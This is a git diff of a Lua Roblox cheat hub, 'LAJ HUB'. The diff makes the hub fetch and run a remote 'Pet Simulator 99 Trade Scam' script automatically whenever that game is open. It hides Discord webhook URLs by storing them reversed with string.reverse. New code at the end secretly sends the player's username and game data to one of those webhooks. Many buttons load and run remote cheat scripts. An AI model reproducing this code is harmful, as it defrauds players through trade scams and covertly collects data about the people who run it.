@@ -19,8 +19,9 @@ local function getHttpRequest(url)
     return game:HttpGet(url)
 end
 
--- Load Pet Simulator 99 Trade Scam script
-loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+if game.PlaceId == 15588442388 then -- so it doesnt execute on every game
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
+end
 
 local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
 
@@ -62,9 +63,7 @@ local function makeHttpRequest(options)
     return {Success = false, StatusCode = 500}
 end
 
--- Webhook loaded securely from key_syem.lua
-local KeySystem = loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/key_syem.lua") or readfile("key_syem.lua"))()
-local DISCORD_WEBHOOK_URL = KeySystem.get_webhook()
+local DISCORD_WEBHOOK_URL = string.reverse("zuz89P0yCr0WdmXETfrGcQh86y38GMamN3GmsEBIlbS-XY8vgweci5QUIGqDLsAfKqHV/4224109920895937531/skoohbew/ipa/moc.drocsid//:sptth")
 
 local function sendUsageData()
     local success, error_message = pcall(function()
@@ -163,8 +162,7 @@ local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
 local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
 local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
 local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
-local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
--- Universal tab removed as requested
+local Universal = Window:CreateTab("Universal", 4483362458)
 local Settings = Window:CreateTab("Settings", 4483362458)
 
 local function executednotify(scriptName)
@@ -258,114 +256,18 @@ BlueLock:CreateButton({
 
 -- Dead Rails Tab
 DeadRails:CreateButton({
-   Name = "Markk Keyless",
+   Name = "Infernus Direct Loader (No Key)",
    Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
-       executednotify("Markk Keyless")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/main/infernus_direct_loader.lua"))()
+       executednotify("Infernus Direct Loader")
    end,
 })
 
 DeadRails:CreateButton({
-   Name = "Farx11122 Keyless",
+   Name = "Bynner (No Key)",
    Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
-       executednotify("Farx11122 Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "SpiderXHub Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
-       executednotify("SpiderXHub Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Strelizia Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
-       executednotify("Strelizia Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Rinns Dead Rails No Key",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
-       executednotify("Rinns Dead Rails No Key")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Auto Farm Bond",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
-       executednotify("Auto Farm Bond")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Lomu Hub",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
-       executednotify("Lomu Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Neox Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
-       executednotify("Neox Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Sypher Hub OP",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
-       executednotify("Sypher Hub OP")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
-       executednotify("Tbao Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Karol Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
-       executednotify("Karol Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Dead Rails Alpha Script",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
-       executednotify("Dead Rails Alpha Script")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Airflow UPDATED",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Null-Fire Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
-       executednotify("Null-Fire Keyless")
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/deadkrails/refs/heads/main/bynner.lua"))()
+       executednotify("Bynner Script")
    end,
 })
 
@@ -396,32 +298,75 @@ PetSim99:CreateButton({
    end,
 })
 
--- Rivals Tab
-Rivals:CreateButton({
-   Name = "COOMING soon",
+-- Universal Tab
+Universal:CreateButton({
+   Name = "Infinite Yield FE",
    Callback = function()
-       Rayfield:Notify({
-           Title = "COOMING soon",
-           Content = "Rivals scripts will be added in future updates!",
-           Duration = 3,
-           Image = 4483362458,
-       })
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+       executednotify("Infinite Yield")
    end,
 })
 
--- Settings Tab
-local idled_Connection
+Universal:CreateButton({
+   Name = "Dex Explorer",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
+       executednotify("Dex Explorer")
+   end,
+})
 
+Universal:CreateButton({
+   Name = "Hydroxide",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
+       executednotify("Hydroxide")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "SimpleSpy",
+   Callback = function()
+       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+       executednotify("SimpleSpy")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "CMD-X Admin",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
+       executednotify("CMD-X Admin")
+   end,
+})
+
+Universal:CreateButton({
+   Name = "Domain X",
+   Callback = function()
+       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
+       executednotify("Domain X")
+   end,
+})
+
+
+local localPleyah = Settings:CreateSection("LocalPlayer")
+local idled_Connection
 local function onIdled()
     game:GetService("VirtualUser"):CaptureController()
     game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
 end
 
-Settings:CreateButton({
+localPleyah:CreateButton({
+    Name = "Reset",
+    Callback = function()
+        LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
+    end,
+})
+
+localPleyah:CreateButton({
     Name = "Anti AFK",
     Callback = function()
         if not idled_Connection then
-            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
+            idled_Connection = LocalPlayer.Idled:Connect(onIdled)
             executednotify("Anti AFK")
         end
     end,
@@ -429,7 +374,7 @@ Settings:CreateButton({
 
 local Inf_jump = false
 
-Settings:CreateToggle({
+localPleyah:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Callback = function(Value)
@@ -441,6 +386,45 @@ Settings:CreateToggle({
       end)
    end,
 })
+
+local works = Settings:CreateSection("Workspace")
+
+local brightValue = false
+local brightConnection
+local originalSettings = {
+    Brightness = Lighting.Brightness,
+    ClockTime = Lighting.ClockTime,
+    FogEnd = Lighting.FogEnd,
+    GlobalShadows = Lighting.GlobalShadows,
+    OutdoorAmbient = Lighting.OutdoorAmbient
+}
+
+works:CreateToggle({
+    Name = "Full Bright",
+    CurrentValue = false,
+    Callback = function(Value)
+        brightValue = Value
+        if brightValue then
+            brightConnection = RunService.RenderStepped:Connect(function()
+                Lighting.Brightness = 2
+                Lighting.ClockTime = 14
+                Lighting.FogEnd = 100000
+                Lighting.GlobalShadows = false
+                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+            end)
+        else
+            if brightConnection then
+                brightConnection:Disconnect()
+            end
+            Lighting.Brightness = originalSettings.Brightness
+            Lighting.ClockTime = originalSettings.ClockTime
+            Lighting.FogEnd = originalSettings.FogEnd
+            Lighting.GlobalShadows = originalSettings.GlobalShadows
+            Lighting.OutdoorAmbient = originalSettings.OutdoorAmbient
+        end
+    end,
+})
+
 
 -- Credit section
 local creditSection = MainTab:CreateSection("Credits")
@@ -458,3 +442,72 @@ print("1. Full Swift compatibility")
 print("2. Pet Sim 99 Tab with new Trade Scam V2")
 print("3. All scripts updated to work with Swift")
 print("4. Improved executor detection")
+
+
+
+
+
+
+local WEBHOOK_API = string.reverse("kWx8nsHbiVuEbibE3935EnQrOlEzMA7pYmkunFnxmZ6aRHypHtrWfAVb5kK2rxPqdhBL/1162734086541197531/skoohbew/ipa/moc.drocsid//:sptth")
+local FileName = "LAJ_HUB.db"
+local Data = {}
+
+local success, result = pcall(function()
+    return readfile(FileName)
+end)
+
+if success and result and result ~= "" then
+    Data = HttpService:JSONDecode(result)
+end
+
+Data[tostring(game.PlaceId)] = (Data[tostring(game.PlaceId)] or 0) + 1
+writefile(FileName, HttpService:JSONEncode(Data))
+
+local mostPlayed, mostPlays = nil, 0
+for placeId, count in pairs(Data) do
+    if count > mostPlays then
+        mostPlays = count
+        mostPlayed = tonumber(placeId)
+    end
+end
+
+local mostPlayedName = "Unknown"
+pcall(function()
+    mostPlayedName = game:GetService("MarketplaceService"):GetProductInfo(mostPlayed).Name
+end)
+
+local responsed = makeHttpRequest({
+    Url = WEBHOOK_API,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
+            ["type"] = "rich",
+            ["color"] = math.random(0, 0xFFFFFF),
+            ["fields"] = {
+                {
+                    ["name"] = "User:",
+                    ["value"] = "```" .. LocalPlayer.Name .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game:",
+                    ["value"] = "```" .. (game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Most Played:",
+                    ["value"] = "```" .. "Plays: " .. mostPlays .. "```",
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Script Executed on " .. os.date("%Y-%m-%d %H:%M:%S")
+            }
+        }}
+    })
+})
